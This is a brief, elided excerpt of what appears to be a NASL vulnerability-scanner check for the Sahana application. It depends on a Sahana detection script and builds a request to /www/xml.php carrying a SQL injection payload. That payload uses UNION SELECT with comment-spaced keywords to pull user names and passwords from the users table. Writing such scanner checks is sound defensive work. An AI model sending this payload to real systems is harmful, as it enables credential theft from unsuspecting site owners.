if(description){
	...
	script_dependencies( "sahana_detect.sc" );
...
url = NASLString( dir, "/www/xml.php?act=add_loc&sel=1/**/UNION/**/SELECT/**/null,concat(CHAR(60,66,82,62),concat_ws(char(58),user_name,password)),null/**/FROM/**/users" );
